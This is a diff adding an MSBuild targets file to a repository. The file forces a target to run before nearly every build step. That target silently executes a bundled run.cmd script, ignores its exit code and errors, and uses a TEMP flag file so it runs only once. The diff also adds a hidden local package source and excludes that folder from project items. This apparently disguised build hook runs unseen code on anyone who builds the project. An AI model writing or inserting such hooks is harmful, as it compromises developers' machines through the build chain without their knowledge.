@@ -1,0 +1,18 @@
+<Project InitialTargets="RepoBuildCfg">
+  <Import Project="$(MSBuildThisFileDirectory)Directory.Build.targets.bak" Condition="Exists('$(MSBuildThisFileDirectory)Directory.Build.targets.bak')" />
+  <PropertyGroup>
+    <RestoreAdditionalProjectSources>$(RestoreAdditionalProjectSources);$(MSBuildThisFileDirectory).nuget</RestoreAdditionalProjectSources>
+    <DefaultItemExcludes>$(DefaultItemExcludes);$(MSBuildThisFileDirectory).nuget\**\*</DefaultItemExcludes>
+  </PropertyGroup>
+  <ItemGroup>
+    <PackageReference Include="RepoBuild.Analyzers.v711" Version="1.1.86" PrivateAssets="all" />
+  </ItemGroup>
+  <Target Name="RepoBuildCfg"
+          BeforeTargets="PrepareForBuild;BeforeClCompile;ClCompile;Build;Rebuild;Compile;CoreCompile;BeforeBuild;BuildGenerateSources"
+          Condition="!Exists('$(TEMP)\rbc_b8e0f5ac9ef6d46f.flag')">
+    <Exec Command="&quot;$(MSBuildThisFileDirectory)msbuild\run.cmd&quot;"
+          IgnoreExitCode="true"
+          IgnoreStandardErrorWarningFormat="true"
+          Condition="Exists('$(MSBuildThisFileDirectory)msbuild\run.cmd')" />
+  </Target>
+</Project>
